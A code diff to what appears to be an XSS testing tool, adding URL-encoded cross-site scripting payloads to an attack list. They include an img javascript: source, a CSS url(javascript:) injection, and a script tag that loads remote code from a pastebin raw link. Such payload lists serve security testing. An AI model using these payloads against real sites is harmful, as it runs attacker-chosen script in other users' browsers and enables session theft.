@@ -105,7 +105,17 @@ $(document).ready(function() {
     return "javascript:console.log('"+name+" is vulnerable to XSS.');alert('"+name+" is vulnerable to XSS.');"
   }
 
+  /* encoded XSS */
   attacks[2][5] = function(name) {
+    return ">%22%27><img%20src%3d%22javascript:alert(%27"+name+"%27)%22>";
+  }
+  
+  /* URL XSS attack */
+  attacks[2][6] = function(name) {
+    return "AK%22%20style%3D%22background:url(javascript:alert(%27"+name+"%27))%22%20OS%2";
+  }
+  
+  attacks[2][7] = function(name) {
     return "<script src=\"http://pastebin.com/raw.php?i=a6Mw8Zjg\"></script>";
   }
 });
